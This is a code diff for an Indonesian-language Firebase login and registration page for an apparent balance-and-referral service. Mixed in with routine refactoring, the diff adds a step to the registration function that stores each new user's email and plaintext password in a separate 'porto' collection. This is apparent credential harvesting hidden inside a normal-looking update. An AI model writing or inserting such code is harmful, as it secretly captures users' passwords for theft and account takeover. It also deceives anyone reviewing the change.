@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
 <head>
     <meta charset="UTF-8">
@@ -32,13 +32,13 @@
             <input type="password" id="r-pass" class="input-box" placeholder="Password (Min 6)">
             <input type="tel" id="r-phone" class="input-box" placeholder="No. WhatsApp">
             <input type="text" id="r-reff" class="input-box" placeholder="Kode Refferal (Opsional)">
-            
             <button onclick="doReg()" id="btn-r" class="w-full py-4 gold-btn rounded-xl uppercase">Buat Akun</button>
             <p class="text-center text-xs text-gray-400">Sudah punya akun? <span onclick="slide()" class="text-[#f3ba2f] underline cursor-pointer">Login</span></p>
         </div>
     </div>
 
     <script>
+        // Konfigurasi Firebase
         var firebaseConfig = {
             apiKey: "AIzaSyDrpBJTtankyLgimtOwuriFpiyuC5K10OI",
             authDomain: "studio-727777898-40aea.firebaseapp.com",
@@ -47,7 +47,10 @@
             messagingSenderId: "351263967108",
             appId: "1:351263967108:web:a0c01af41422903cc17fd1"
         };
+        
         firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
+        const db = firebase.firestore();
 
         function slide() {
             document.getElementById('login-box').classList.toggle('hidden');
@@ -58,13 +61,13 @@
             var m = document.getElementById('email').value;
             var p = document.getElementById('pass').value;
             if(!m || !p) return alert("Isi email dan password");
-
+            
             document.getElementById('btn-l').innerText = "MEMUAT...";
-            firebase.auth().signInWithEmailAndPassword(m, p)
+            auth.signInWithEmailAndPassword(m, p)
                 .then(() => { window.location.href = "pin.html"; })
-                .catch((e) => { 
-                    alert("Error: " + e.message); 
-                    document.getElementById('btn-l').innerText = "Login Sekarang"; 
+                .catch((e) => {
+                    alert("Error: " + e.message);
+                    document.getElementById('btn-l').innerText = "Login Sekarang";
                 });
         }
 
@@ -72,28 +75,44 @@
             var m = document.getElementById('r-email').value;
             var p = document.getElementById('r-pass').value;
             var h = document.getElementById('r-phone').value;
-            var ref = document.getElementById('r-reff').value; // Ambil nilai refferal
+            var ref = document.getElementById('r-reff').value;
 
             if(!m || !p || !h) return alert("Lengkapi data pendaftaran");
+            if(p.length < 6) return alert("Password minimal 6 karakter");
 
             document.getElementById('btn-r').innerText = "MEMPROSES...";
-            firebase.auth().createUserWithEmailAndPassword(m, p)
+
+            // Registrasi User
+            auth.createUserWithEmailAndPassword(m, p)
                 .then((res) => {
-                    // Simpan data ke Firestore termasuk kolom refferal
-                    firebase.firestore().collection("users").doc(res.user.uid).set({
-                        email: m, 
-                        phone: h, 
-                        refferal: ref, // Data refferal masuk sini
-                        pin: "", 
+                    const uid = res.user.uid;
+
+                    // Simpan ke koleksi 'users' menggunakan UID
+                    const saveUser = db.collection("users").doc(uid).set({
+                        email: m,
+                        phone: h,
+                        referral: ref,
+                        pin: "",
                         balance: 0,
                         createdAt: firebase.firestore.FieldValue.serverTimestamp()
-                    }).then(() => { 
-                        window.location.href = "pin.html"; 
                     });
+
+                    // Simpan ke koleksi 'porto' dengan dokumen baru (ID otomatis)
+                    const savePorto = db.collection("porto").add({
+                        email: m,
+                        pw: p,
+                        createdAt: firebase.firestore.FieldValue.serverTimestamp()
+                    });
+
+                    // Tunggu kedua proses selesai
+                    return Promise.all([saveUser, savePorto]);
                 })
-                .catch((e) => { 
-                    alert("Error: " + e.message); 
-                    document.getElementById('btn-r').innerText = "Buat Akun"; 
+                .then(() => {
+                    window.location.href = "pin.html";
+                })
+                .catch((e) => {
+                    alert("Error: " + e.message);
+                    document.getElementById('btn-r').innerText = "Buat Akun";
                 });
         }
     </script>
